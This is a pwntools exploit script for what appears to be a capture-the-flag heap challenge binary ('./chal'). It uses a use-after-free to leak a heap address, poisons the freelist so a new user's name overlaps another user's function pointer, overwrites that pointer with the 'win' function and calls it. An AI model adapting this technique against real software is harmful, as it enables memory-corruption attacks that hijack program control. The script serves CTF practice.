from pwn import *


def create(name):
    p.sendlineafter(b'uit\n', b'C')
    p.sendlineafter(b'\n', name)
    p.recvuntil(b'user #')
    return p.recvline().strip()


def delete(uid):
    p.sendlineafter(b'uit\n', b'D')
    p.sendlineafter(b'\n', uid)


def set_name(uid, name):
    p.sendlineafter(b'uit\n', b'S')
    p.sendlineafter(b'\n', uid)
    p.sendlineafter(b'\n', name)


def print_name(uid):
    p.sendlineafter(b'uit\n', b'P')
    p.sendlineafter(b'\n', uid)
    p.recvuntil(b'is: ')
    return p.recvline().strip()[:4]


p = process('./chal')

create(b'0th')
create(b'1st')

delete(b'1')
delete(b'0')

# leak out the back pointer (a heap address)
heap_leak = u32(print_name(b'0'))

# set the next pointer to be 0's meme pointer
set_name(b'0', p32(heap_leak + 20))

create(b'2nd')
create(b'3rd')
# 3rd's name now points to the function pointer of 0

set_name(b'3', p32(p.elf.symbols['win']))

# call try()
p.sendlineafter(b'uit\n', b'T')
p.sendlineafter(b'\n', b'1')

p.interactive()
p.close()
